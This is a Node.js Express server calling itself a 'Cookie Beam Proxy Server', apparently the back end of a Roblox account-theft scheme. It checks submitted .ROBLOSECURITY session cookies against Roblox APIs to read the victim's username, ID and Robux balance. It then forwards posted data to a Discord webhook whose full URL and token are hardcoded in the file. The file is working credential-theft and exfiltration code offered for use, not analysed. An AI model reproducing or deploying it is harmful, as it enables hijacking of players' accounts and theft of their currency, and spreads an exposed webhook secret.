const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();

// Enable CORS and JSON parsing
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Webhook URL from environment variable or fallback
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1537430116756619355/uAO-C2gl8toO3BiClhFUJ-9t8IgX7JmfAxzLnPfEShP5ArdjBmksdwjXWE9FKi7mIWsA';

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Validate cookie – uses the authenticated user endpoint (returns JSON reliably)
app.post('/validate', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }

    try {
        console.log('🔍 Validating cookie via users.roblox.com...');

        // Step 1: Get user info
        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });

        if (userRes.status === 401) {
            console.log('❌ Invalid cookie (401)');
            return res.status(401).json({ valid: false, error: 'Invalid cookie (401 Unauthorized)' });
        }

        if (!userRes.ok) {
            const text = await userRes.text();
            console.log(`⚠️ User API error ${userRes.status}: ${text.substring(0, 100)}`);
            return res.status(userRes.status).json({ valid: false, error: `User API error: ${userRes.status}` });
        }

        const userData = await userRes.json();
        console.log('✅ User authenticated:', userData.name, '(ID:', userData.id, ')');

        // Step 2: Fetch Robux balance
        let robux = 'Unknown';
        try {
            const robuxRes = await fetch('https://economy.roblox.com/v1/users/authenticated/currency', {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });
            if (robuxRes.ok) {
                const robuxData = await robuxRes.json();
                robux = robuxData.robux || 'Unknown';
                console.log('💰 Robux balance:', robux);
            } else {
                console.log('⚠️ Robux API returned', robuxRes.status);
            }
        } catch (e) {
            console.log('⚠️ Could not fetch Robux:', e.message);
        }

        res.json({
            valid: true,
            username: userData.name,
            id: userData.id,
            robux: robux
        });

    } catch (e) {
        console.error('❌ Proxy error:', e.message);
        res.status(500).json({ valid: false, error: 'Proxy error: ' + e.message });
    }
});

// Webhook forwarder
app.post('/send-webhook', async (req, res) => {
    const payload = req.body;
    if (!payload) {
        return res.status(400).json({ error: 'Payload is required' });
    }

    try {
        console.log('📤 Forwarding to Discord webhook...');
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log('✅ Webhook sent successfully');
            res.json({ status: 'sent' });
        } else {
            const text = await response.text();
            console.log(`⚠️ Webhook error ${response.status}: ${text.substring(0, 100)}`);
            res.status(response.status).json({ error: `Webhook error: ${response.status}` });
        }
    } catch (e) {
        console.error('❌ Webhook forward error:', e.message);
        res.status(500).json({ error: 'Webhook forward error: ' + e.message });
    }
});

// Serve index.html for all other routes
app.get('*', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🍪 Cookie Beam Proxy Server running on port ${PORT}`);
    console.log(`📡 Webhook configured: ${WEBHOOK_URL.substring(0, 50)}...`);
});
